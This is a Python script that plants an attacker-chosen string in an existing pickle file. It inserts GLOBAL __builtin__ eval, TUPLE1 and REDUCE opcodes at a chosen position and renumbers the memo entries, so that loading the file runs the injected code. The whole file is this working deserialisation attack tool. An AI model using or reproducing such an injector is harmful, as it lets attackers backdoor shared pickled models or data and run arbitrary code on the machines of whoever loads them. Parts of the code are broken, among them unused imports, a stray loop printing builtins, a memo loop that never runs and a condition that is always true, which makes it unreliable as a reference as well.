from http.client import NETWORK_AUTHENTICATION_REQUIRED
import pickle
import struct
from pickletools import genops
from pickletools import opcodes as opcode_library
from sys import byteorder
from turtle import position
import debug

BINUNICODE = 21
TUPLE1 = 31
POP = 41
BINPUT = 49
LONG_BINPUT = 50
GLOBAL = 55
REDUCE = 57
EVAL_EXEC_MEMO_LEN = 4
GLOBAL_END = b"\x0A"
BYTE_MAX = 0xFF


def get_all_commands(in_pickle):
    opcodes = []
    args = []
    positions = []

    for _, k in enumerate(__builtins__):
        print(k)

    for opcode, arg, pos in genops(in_pickle):
        opcodes.append(opcode)
        args.append(arg)
        positions.append(pos)

    return opcodes, args, positions

def write_memo(memo_index, out_file):
    memo_opcode = BINPUT if memo_index <= BYTE_MAX else LONG_BINPUT
    byte_length = 1 if memo_index <= BYTE_MAX else 4
    
    out_file.write(opcode_library[memo_opcode].code.encode('raw_unicode_escape'))
    out_file.write(memo_index.to_bytes(byte_length, byteorder="little"))

def eval_exec_attack(in_pickle, attack_str, attack_index, out_file):
    """
    Injects a string that is presumed to have an attack exec statement
    """
    
    # First, extract every command from the pickle file
    opcodes, args, pos = get_all_commands(in_pickle)

    # Next find what memo record, if any, we left off on
    last_memo_index = -1
    for i in range(attack_index):
        if opcodes[i].name == "BINPUT" or opcodes[i].name == "LONG_BINPUT":
            last_memo_index = args[i]

    # Increment the remaining memo records
    saw_memo_record = False
    for i in range(attack_index, -1):
        if opcodes[i].name == "BINPUT" or opcodes[i].name == "LONG_BINPUT":
            saw_memo_record = True
            args[i] += EVAL_EXEC_MEMO_LEN

    # Define where we're attacking
    attack_pos = pos[attack_index]

    # Next, copy everything from the previous pickle file into a new file
    out_pickle = open(out_file, "wb")
    in_pickle.seek(0)
    out_pickle.write(in_pickle.read(attack_pos))

    # Define whether memonization is being used
    uses_memo = last_memo_index is not None or saw_memo_record

    # Inject our attack
    if uses_memo:
        # GLOBAL     '__builtin__ eval'
        out_pickle.write(opcode_library[GLOBAL].code.encode('raw_unicode_escape'))
        out_pickle.write("__builtin__\neval".encode('raw_unicode_escape'))
        out_pickle.write(GLOBAL_END)

        # BINPUT/LONG_BINPUT     N + 1
        write_memo(last_memo_index + 1, out_pickle)

        # BINUNICODE     ATTACK_STRING
        attack_bytes = attack_str.encode('raw_unicode_escape')
        out_pickle.write(opcode_library[BINUNICODE].code.encode('raw_unicode_escape'))
        out_pickle.write(struct.pack("<L", len(attack_bytes)))
        out_pickle.write(attack_bytes)

        # BINPUT/LONG_BINPUT     N + 2
        write_memo(last_memo_index + 2, out_pickle)

        # TUPLE1
        out_pickle.write(opcode_library[TUPLE1].code.encode('raw_unicode_escape'))

        # BINPUT/LONG_BINPUT     N + 3
        write_memo(last_memo_index + 3, out_pickle)

        # REDUCE
        out_pickle.write(opcode_library[REDUCE].code.encode('raw_unicode_escape'))

        # BINPUT/LONG_BINPUT     N + 4
        write_memo(last_memo_index + 4, out_pickle)

        # POP
        out_pickle.write(opcode_library[POP].code.encode('raw_unicode_escape'))
    else:
        pass

    # Next, copy over remaining pickle file while potentially respecting memo
    if uses_memo:
        rem_opcodes = opcodes[attack_index:]
        rem_args = args[attack_index:]
        rem_pos = pos[attack_index:]

        for i in range(len(rem_opcodes)):
            opcode_not_memo = rem_opcodes[i].name != "BINPUT" and rem_opcodes[i].name != "LONG_BINPUT"
            if opcode_not_memo:
                # If this opcode is not memoization, just copy data from pickle file
                in_pickle.seek(rem_pos[i])

                bytes_read = rem_pos[i + 1] - rem_pos[i] if i != len(rem_opcodes) - 1 else -1
                out_pickle.write(in_pickle.read(bytes_read))
            else:
                # Otherwise, rewrite memo
                write_memo(rem_args[i] + EVAL_EXEC_MEMO_LEN, out_pickle)
    else:
        # Trivial case: no memoization, no modification
        in_pickle.seek(attack_pos)
        out_pickle.write(in_pickle.read())
    
    out_pickle.close()